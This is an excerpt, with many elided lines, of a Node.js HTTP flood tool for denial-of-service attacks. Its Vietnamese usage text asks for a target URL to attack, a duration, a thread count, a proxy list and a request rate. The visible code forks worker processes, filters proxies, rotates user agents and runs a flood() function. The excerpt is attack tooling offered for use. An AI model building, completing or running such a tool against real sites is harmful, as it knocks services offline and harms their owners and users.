...
if (!target || !time || !thread || !proxyFile || !rps) {
    console.log('\x1b[31m%s\x1b[0m', 'Sai cú pháp');
    console.log('\x1b[32mCách dùng:\x1b[0m node aaa.js <url> <thời gian> <số luồng> <proxy.txt> <rps>');
    console.log('');
    console.log('\x1b[36mHDSD:\x1b[0m');
    console.log('  <url>        - Địa chỉ web cần tấn công (phải có http:// hoặc https://)');
    console.log('  <thời gian>  - Thời gian tấn công (tính bằng giây)');
    console.log('  <số luồng>   - Số lượng luồng xử lý (VD: 10)');
    console.log('  <proxy.txt>  - File chứa danh sách proxy (mỗi dòng 1 proxy IP:PORT)');
    console.log('  <rps>        - Số lượng request gửi mỗi giây mỗi luồng (tối đa 512)');
    console.log('');
    console.log('\x1b[33mVí dụ:\x1b[0m');
    console.log('  node aaa.js https://example.com 60 10 proxy.txt 200');
    process.exit(1);
}
...
const proxyr = () => {
    ...
    do {
        ...
        proxy.startsWith("192.") ||
        proxy.startsWith("127.") ||
  ...
  cluster.fork();
   ...
   setTimeout(() => process.exit(-1), time * 1000);
     ...
     function flood() {
        ...
        const uas = userAgents[Math.floor(Math.random() * userAgents.length)];
